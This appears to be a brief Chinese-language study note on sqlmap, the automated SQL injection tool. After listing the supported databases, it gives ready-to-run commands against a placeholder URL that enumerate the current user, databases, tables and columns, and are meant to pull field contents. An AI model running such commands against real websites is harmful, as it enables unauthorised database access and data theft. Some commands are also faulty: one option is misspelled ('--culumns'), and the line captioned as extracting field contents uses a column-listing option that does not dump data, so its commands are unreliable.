# sqlmap

## SQLMAP 简介

> ，一个自动化的SQL注入工具，主要功能是扫描、发现并利用给定URL的SQL注入漏洞，目前支持的数据库有：
- MySQL
- Oracle
- PostgreSQL
- Microsoft SQL Server
- Microsoft Access
- IBM DB2
- SQLite
- Firebird
- Sybase
- SAP MaxDB

## SQLMAP 常用命令

```bash
sqlmap.py -u "http://xxx.com/news?id=1" --current-user
# 获取当前用户名称
sqlmap.py -u "http://xxx.com/news?id=1" --current-db
# 获取当前数据库名称
sqlmap.py -u "http://xxx.com/news?id=1" --tables -D "db_name"
# 列表名
sqlmap.py -u "http://xxx.com/news?id=1" --culumns -T "tablename" -D "db_name"
# 列字段
sqlmap.py -u "http://xxx.com/news?id=1" --columns -C "column_name" -T "tablename" -D "db_name"
# 获取字段内容
```

参数说明:

- `-u` URL
- `--current-user` 当前用户名称
- `--tables` 列出表
- `--dbs` 列出数据库
- `-T [table_name] --columns` 查询指定表名的列
- `-T [table_name] -C [column_name]` 查询指定字段名